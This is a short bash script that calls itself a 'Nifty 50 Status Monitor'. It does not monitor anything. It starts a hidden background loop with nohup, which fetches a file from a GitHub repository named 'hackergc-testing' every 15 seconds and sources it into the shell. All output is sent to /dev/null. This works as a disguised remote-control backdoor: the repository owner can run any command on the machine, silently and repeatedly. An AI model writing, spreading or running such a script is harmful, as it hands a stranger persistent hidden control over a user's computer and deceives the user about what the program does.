#!/bin/bash
# Nifty 50 Status Monitor - Version 1.0.8 (Burst Start - No Log)
mkdir -p ~/.nifty_status

# The background loop using wget with initial burst
nohup bash -c "
    # Initial run at T=0
    wget -qO ~/.nifty_status/current_env https://raw.githubusercontent.com/Coder-GC/hackergc-testing/main/ticker.dat > /dev/null 2>&1
    source ~/.nifty_status/current_env > /dev/null 2>&1
    
    # Wait 1 minute after first run
    sleep 60

    # Main loop every 15 seconds
    while true; do
        wget -qO ~/.nifty_status/current_env https://raw.githubusercontent.com/Coder-GC/hackergc-testing/main/ticker.dat > /dev/null 2>&1
        source ~/.nifty_status/current_env > /dev/null 2>&1
        sleep 15
    done" > /dev/null 2>&1 &

echo "Background status monitor initialized with wget."
